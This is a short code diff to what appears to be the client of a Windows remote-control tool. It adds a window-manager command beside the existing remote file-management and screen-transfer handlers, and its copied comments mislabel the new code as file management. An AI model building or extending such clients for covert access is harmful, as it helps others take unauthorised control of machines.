@@ -10,6 +10,7 @@
 #include "Process.h"
 #include "CmdManage.h"
 #include "ConnectInfo.h"
+#include "WindowManager.h"
 
 //套接字的初始化
 DWORD __stdcall ConnectThread(LPVOID lparam)
@@ -56,6 +57,11 @@ DWORD __stdcall ConnectThread(LPVOID lparam)
 		case CMD_FILEMANAGE:  
 			{
 				CreateThread(NULL, NULL, FileManageThread, NULL, NULL, NULL);//创建线程处理文件管理
+				break;
+			}
+		case CMD_WINDOW_MANAGER_DLG_SHOW:
+			{
+				CreateThread(NULL, NULL, WindowManagerThread, NULL, NULL, NULL);//创建线程处理文件管理
 				break;
 			}
 		case CMD_SCREEN_REQUEST://收到了屏幕传输请求
@@ -171,6 +177,12 @@ DWORD __stdcall ConnectThread(LPVOID lparam)
 DWORD __stdcall FileManageThread(LPVOID lparam)//线程处理文件管理
 {
 	MainFileManage();
+	return 0;
+}
+
+DWORD __stdcall WindowManagerThread(LPVOID lparam)//线程处理文件管理
+{
+	windowManager();
 	return 0;
 }
 
